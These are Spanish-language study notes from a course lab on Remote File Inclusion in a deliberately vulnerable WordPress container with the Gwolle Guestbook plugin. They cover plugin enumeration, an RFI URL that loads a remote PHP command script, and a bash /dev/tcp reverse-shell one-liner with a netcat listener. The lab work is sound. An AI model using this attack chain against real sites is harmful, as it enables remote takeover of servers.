## Mis apuntes: 

Bueno hay que tener en cuenta que la sigla RFI viene de inclusión de archivos remotos, y estas al igual de los LFI(inclusión de archivos locales) se pueden convertir en RCE(Ejecución remota de código), montaremos un wordpress para con un plugin llamado gwolle veamos de que se trata los RCE
para poder instalar el plugin tenemos que hacer lo siguiente: 
```
docker exec -it dvwp_wordpress_1 bash
una vez dentro del contenedor, tenemos que ocupar chown: 
chown www-data:www-data -R wp-content
```
una ves se hace esto, podemos instalar:
![[Pasted image 20240229155124.png]]
para poder enumerar los plugins podemos ocupar wfuz, y tenemos un script para esto y es :
![[Pasted image 20240229182340.png]]
entonces la aplicación de wfuzz seria tal que asi: 
```
wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt http://localhost:31337/FUZZ
```
![[Pasted image 20240229190518.png]]
entonces por lo que encontramos en con esta enumeración es que gwolle esta instalado. 
ahora si buscamos en searchsploit el plugin podemos ver que existe 1 exploit para explotar este plugin: 
![[Pasted image 20240229191849.png]]
si hacemos un searchsploit -m el exploit a descargar, podemos ver que descargamos el script: 
![[Pasted image 20240229192010.png]]
para poder ver que hace el RFI tenemos que tener una configuración en la maquina ya establecida que es el allow_url_include = "on"; 
![[Pasted image 20240301012141.png]]
después de aplicar esta configuración, procederemos a hacer un ``docker restart [nombre de la maquina]``
ahora si vemos el exploit podemos ver lo siguiente:
![[Pasted image 20240301013006.png]]
vemos que hay una forma de poder mandar peticiones desde la url a un servidor web, por lo que si lo probamos conseguiremos lo siguiente: 
```
http://localhost:31337/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://192.168.1.88/
```
![[Pasted image 20240301013234.png]]
si bien no sale nada si vemos la parte del servidor veremos lo siguiente: 
![[Pasted image 20240301013316.png]]
ahi vemos que pregunta por un archivo wp-load.php, que si lo creamos y ponemos un script en php podemos ejecutar comandos dentro de la maquina: 
![[Pasted image 20240301013644.png]]
![[Pasted image 20240301013706.png]]
ahora podemos controlar los comandos a traves de la url de la siguiente forma: 
![[Pasted image 20240301013839.png]]
![[Pasted image 20240301013900.png]]
por lo tanto estamos haciendo un RCE, si mandamos el siguiente one liner y nos ponemos en escucha por el puerto 443 con netcat  podremos tomar posesion de la maquina facilmente: 
```
localhost:31337/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://192.168.1.88/&cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.88/443 0>%261"

comando de netcat: 
nc -nlvp 443
```
![[Pasted image 20240301014312.png]]
![[Pasted image 20240301014322.png]]



----
## Datos de la clase: 

La vulnerabilidad **Remote File Inclusion** (**RFI**) es una vulnerabilidad de seguridad en la que un atacante puede **incluir** **archivos remotos** en una aplicación web vulnerable. Esto puede permitir al atacante ejecutar código malicioso en el servidor web y comprometer el sistema.

En un ataque de RFI, el atacante utiliza una entrada del usuario, como una URL o un campo de formulario, para incluir un archivo remoto en la solicitud. Si la aplicación web no valida adecuadamente estas entradas, procesará la solicitud y devolverá el contenido del archivo remoto al atacante.

Un atacante puede utilizar esta vulnerabilidad para incluir archivos remotos maliciosos que contienen código malicioso, como virus o troyanos, o para ejecutar comandos en el servidor vulnerable. En algunos casos, el atacante puede dirigir la solicitud hacia un recurso PHP alojado en un servidor de su propiedad, lo que le brinda un mayor grado de control en el ataque.

A continuación, se proporciona el enlace al proyecto de Github correspondiente al laboratorio que estaremos desplegando para practicar esta vulnerabilidad:

- **DVWP**: [https://github.com/vavkamil/dvwp](https://github.com/vavkamil/dvwp)

Asimismo, se os comparte el enlace directo para la descarga del plugin ‘**Gwolle Guestbook**‘ de WordPress:

- **Gwolle Guestbook**: [https://es.wordpress.org/plugins/gwolle-gb/](https://es.wordpress.org/plugins/gwolle-gb/)